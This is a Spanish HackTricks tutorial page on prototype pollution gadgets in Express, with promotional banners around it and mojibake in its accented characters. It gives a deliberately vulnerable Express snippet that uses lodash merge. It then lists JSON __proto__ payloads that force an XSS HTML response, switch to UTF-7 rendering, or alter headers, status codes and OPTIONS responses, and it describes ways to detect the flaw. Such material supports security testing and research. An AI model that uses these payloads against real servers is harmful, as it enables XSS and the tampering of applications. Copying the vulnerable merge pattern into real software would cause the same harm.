# Gadgets de Poluci贸n de Prototipos en Express

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b煤squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares de robo**.

El objetivo principal de WhiteIntel es combatir los secuestros de cuentas y los ataques de ransomware resultantes de malwares que roban informaci贸n.

Puedes visitar su sitio web y probar su motor de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}

***

## Servir respuestas XSS

**Para m谩s detalles** [**echa un vistazo a la investigaci贸n original**](https://portswigger.net/research/server-side-prototype-pollution)

### Cambiar el tipo de contenido JSON a HTML

En una aplicaci贸n Express que utiliza una respuesta de tipo de contenido **JSON** y refleja un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
En estos casos, normalmente no es posible realizar XSS con un tipo de contenido JSON. Sin embargo, con la contaminaci贸n de prototipos podemos **confundir a Express para que sirva una respuesta HTML.** Esta vulnerabilidad depende de que la aplicaci贸n utilice **`res.send(obj)`** y del uso del analizador de cuerpo con el tipo de contenido application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
### Render UTF7

Es posible hacer que express **renderice contenido UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T茅cnicas de Escaneo Seguras

### Espacios en JSON

El siguiente PP har谩 que los atributos dentro de un JSON tengan un espacio extra que no romper谩 la funcionalidad:
```json
{"__proto__":{"json spaces": " "}}
```
Entonces, un JSON reflejado se ver谩 as铆:
```json
{"foo":  "bar"} -- Note the extra space
```
### Encabezados Expuestos

El siguiente gadget de PP har谩 que el servidor env铆e de vuelta el encabezado HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Se requiere que el m贸dulo **CORS est茅 instalado**

### **M茅todo OPTIONS**

Con la siguiente carga 煤til, es posible **ocultar un m茅todo de una respuesta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Estado**

Es posible cambiar el **c贸digo de estado devuelto** utilizando la siguiente carga 煤til de PP:
```json
{"__proto__":{"status":510}}
```
### Error

Cuando asignas un prototipo con un valor primitivo como una cadena, se produce una **operaci贸n sin efecto ya que el prototipo debe ser un objeto**. Si intentas asignar un objeto prototipo al `Object.prototype` en s铆 mismo, esto **lanzar谩 una excepci贸n**. Podemos usar estos dos comportamientos para **detectar si la contaminaci贸n del prototipo fue exitosa**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Reflejado

Cuando una aplicaci贸n incluye un objeto en su respuesta, crear un atributo con un **nombre inusual junto a `__proto__`** puede ser revelador. Espec铆ficamente, si **solo se devuelve el atributo inusual** en la respuesta, esto podr铆a indicar la vulnerabilidad de la aplicaci贸n:
```json
{"unusualName":"value","__proto__":"test"}
```
Adem谩s, en escenarios donde se emplea una biblioteca como Lodash, establecer una propiedad tanto a trav茅s de la contaminaci贸n del prototipo (PP) como directamente dentro del objeto ofrece otro enfoque de diagn贸stico. Si dicha propiedad se omite de la respuesta, sugiere que Lodash est谩 verificando la existencia de la propiedad en el objeto objetivo antes de fusionarla:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Varios

### Permitir puntos

Hay una opci贸n en Express que te permite **crear objetos a partir de par谩metros de cadena de consulta**.\
Definitivamente podr铆as usarlo en una **cadena** de errores para explotar una **vulnerabilidad de la contaminaci贸n de prototipos**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un objeto en Node.**

## Referencias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) es un motor de b煤squeda alimentado por la **dark web** que ofrece funcionalidades **gratuitas** para verificar si una empresa o sus clientes han sido **comprometidos** por **malwares robadores**.

El objetivo principal de WhiteIntel es combatir tomas de cuentas y ataques de ransomware resultantes de malwares que roban informaci贸n.

Puedes visitar su sitio web y probar su motor de b煤squeda de forma **gratuita** en:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
